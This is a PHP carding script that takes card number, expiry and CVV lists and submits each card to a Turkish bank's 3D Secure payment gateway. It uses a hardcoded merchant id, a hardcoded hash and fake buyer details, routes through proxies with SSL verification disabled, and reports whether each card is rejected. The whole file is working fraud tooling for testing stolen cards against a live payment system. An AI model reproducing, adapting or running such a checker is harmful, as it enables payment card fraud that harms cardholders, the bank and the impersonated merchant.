<?php

// error_reporting(0);
$start_time = microtime(true); 
extract($_REQUEST);

$what_3ds = False;
if (@$tds == 'on'){
	$what_3ds = True;
}

if (@$lista == ''){
	exit('Lista em branco');
}
list($cc, $mm, $yy, $cvv) = explode('|', $lista);
if (strlen($yy)==2){
	$yy = "20$yy";
}
if (strlen($mm) == 1){
   $mm = '0'.$mm; 
}
$ch = curl_init();
$cid = round(microtime(true) * 1000);


$proxy = '';
$proxy_auth = '';

$url = "https://vpos3.isbank.com.tr/fim/est3Dgate";
$post = 'encoding=UTF-8&clientid=700662439280&amount=310.99&oid=TS150557210PS2&okUrl=https%3A%2F%2Fwww.sahinlershop.com%2Forder%3F_st%3D682054d8bc043744060e76691bc5df0d.TS150557210PS2.77d6310cd45d5430cd0234411cb9c51f&failUrl=https%3A%2F%2Fwww.sahinlershop.com%2Forder%3F_st%3D682054d8bc043744060e76691bc5df0d.TS150557210PS2.77d6310cd45d5430cd0234411cb9c51f&rnd=0.63897500+1652581187&hash=tVnLLDeJw0SUdnzCmpeSskUGxJs%3D&storetype=3d&lang=TR&currency=949&taksit=&islemtipi=Auth&Fismi=junioir+sila+silva+&Email=rastilerto%40vusra.com&tel=%2B909999699969&TelFax=&firmaadi=junioir+sila+silva+&Faturafirma=junioir+sila+silva+&Fadres=bnhghghghg&Filce=55h&Fil=Batman&Fpostakodu=51332100&fulkekod=TR&cc_name=junior+silva&pan='.$cc.'&Ecom_Payment_Card_ExpDate_Month='.$mm.'&Ecom_Payment_Card_ExpDate_Year='.$yy.'&cv2='.$cvv.'';
curl_setopt_array($ch, array(
	CURLOPT_URL => $url,
	CURLOPT_SSL_VERIFYPEER => false,
	CURLOPT_RETURNTRANSFER => true,
	CURLOPT_FOLLOWLOCATION => false,
	CURLOPT_POST => True,
	CURLOPT_POSTFIELDS => $post,
	CURLOPT_PROXY => $proxy,
	CURLOPT_PROXYUSERPWD => $proxy_auth,
	CURLOPT_ENCODING => '',
	CURLOPT_COOKIESESSION => 1,
	CURLOPT_COOKIEJAR => getcwd().'/cookies/'.$cid.'.txt',
	CURLOPT_COOKIEFILE => getcwd().'/cookies/'.$cid.'.txt',
	CURLOPT_HTTPHEADER => array(
		'Cache-Control: max-age=0',
		'Upgrade-Insecure-Requests: 1',
		'Origin: https://spos.isbank.com.tr',
		'Content-Type: application/x-www-form-urlencoded',
		'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
		'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
		'Referer: https://spos.isbank.com.tr/',
		'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
	)
));
$result = curl_exec($ch);
if (strpos($result, "MerchantServer") !== false){
	include_once("sicredi_extra.php");
}
exit('Recusado (Cartão inexistente/Inválido)');
